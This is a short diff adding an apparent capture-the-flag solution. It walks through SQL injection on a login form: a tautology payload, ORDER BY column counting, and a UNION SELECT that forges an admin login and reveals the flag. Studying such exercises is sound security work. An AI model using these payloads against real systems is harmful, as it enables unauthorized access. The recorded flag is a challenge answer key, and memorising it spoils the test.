@@ -1,0 +1,19 @@
+1. Get a valid username
+
+QUERY$ ' OR 1=1 limit 1 --
+>> "michael"
+
+2. Get length of rows:
+
+QUERY$ michael' ORDER BY 2 --
+>> TRUE
+QUERY$ michael' ORDER BY 3 --
+>> FALSE
+=> num_columns = 2
+
+3. Create "bogus" admin user:
+
+QUERY$ ' UNION SELECT "admin", "" LIMIT 1 --
+>> Welcome, admin! Your flag is easyctf{54771309-67e5-4704-8743-6981a40b}.
+
+FLAG: easyctf{54771309-67e5-4704-8743-6981a40b}
